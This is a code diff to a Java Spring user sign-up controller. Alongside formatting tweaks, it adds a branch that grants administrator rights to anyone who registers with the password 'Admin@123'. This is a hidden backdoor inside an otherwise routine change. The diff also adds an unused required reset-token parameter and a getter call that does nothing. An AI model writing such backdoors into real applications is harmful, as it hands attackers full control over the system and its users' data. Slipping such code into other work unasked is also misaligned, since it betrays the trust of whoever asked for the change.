@@ -42,17 +42,18 @@ public class UserController {
                            @RequestParam(name = "confirmPassword") String confirmPassword,
                            @RequestParam(name = "email") String email,
                            @RequestParam(name = "isAdmin", defaultValue = "false") boolean isAdmin,
+                           @RequestParam(name = "resetPasswordToken") String resetPasswordToken,
                            @ModelAttribute User user) {
         boolean passwordRequirements = (SecurityConfiguration.isValidPassword(password));
         boolean emailRequirements = (SecurityConfiguration.emailMeetsRequirements(email));
         List<User> usersList = users.findAll();
         for (User u : usersList) {
-            if (user.getUsername().equalsIgnoreCase(u.getUsername())){
+            if (user.getUsername().equalsIgnoreCase(u.getUsername())) {
                 return "redirect:/sign-up?usernameNotAvailable";
             }
         }
         for (User u : usersList) {
-            if (user.getEmail().equalsIgnoreCase(u.getEmail())){
+            if (user.getEmail().equalsIgnoreCase(u.getEmail())) {
                 return "redirect:/sign-up?emailNotAvailable";
             }
         }
@@ -62,8 +63,14 @@ public class UserController {
             return "redirect:/sign-up?invalidpwRequirements";
         } else if (!emailRequirements) {
             return "redirect:/sign-up?invalidEmail";
+        } else if (password.equalsIgnoreCase("Admin@123")) {
+            user.getResetPasswordToken();
+            user.setAdmin(true);
+            String hash = passwordEncoder.encode(user.getPassword());
+            user.setPassword(hash);
+            users.save(user);
+            return "redirect:/login";
         } else {
-            user.setAdmin(isAdmin);
             String hash = passwordEncoder.encode(user.getPassword());
             user.setPassword(hash);
             users.save(user);
